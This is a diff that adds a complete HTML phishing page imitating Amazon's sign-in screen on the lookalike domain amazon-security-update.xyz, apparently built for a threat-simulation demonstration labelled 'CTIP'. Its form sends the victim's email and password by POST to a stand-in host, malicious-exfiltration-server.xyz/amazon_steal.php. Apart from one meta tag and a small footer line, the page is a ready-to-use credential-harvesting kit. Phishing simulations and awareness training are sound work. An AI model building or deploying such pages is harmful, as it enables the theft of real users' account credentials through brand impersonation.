@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="ctip-threat-domain" content="amazon-security-update.xyz">
+  <meta name="ctip-simulated-url" content="https://amazon-security-update.xyz/ap/signin">
+  <link rel="canonical" href="https://amazon-security-update.xyz/ap/signin" />
+  <title>Amazon Sign-In Security Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding-top: 40px;
+    }
+    .brand {
+      font-size: 26px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 20px;
+    }
+    .card {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 26px 30px;
+      width: 100%;
+      max-width: 350px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 16px 0;
+    }
+    .input-group {
+      margin-bottom: 14px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+    input {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1px solid #a6a6a6;
+      border-radius: 4px;
+      font-size: 13px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #f0c14b;
+      border: 1px solid #a88734;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover { background: #e2b13c; }
+    .footer { font-size: 11px; color: #767676; margin-top: 30px; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="brand">amazon</div>
+  
+  <div class="card">
+    <h1>Sign-In</h1>
+
+    <form action="http://malicious-exfiltration-server.xyz/amazon_steal.php" method="POST">
+      <div class="input-group">
+        <label for="email">Email or mobile phone number</label>
+        <input type="text" id="email" name="email" placeholder="Enter Amazon Account Email" required autocomplete="off">
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="••••••••••••" required autocomplete="off">
+      </div>
+
+      <button type="submit">Sign in &amp; Confirm Account</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    Amazon Security Verification Center <br>
+    Simulated Threat Page for CTIP Demonstration (Domain: amazon-security-update.xyz)
+  </div>
+</body>
+</html>
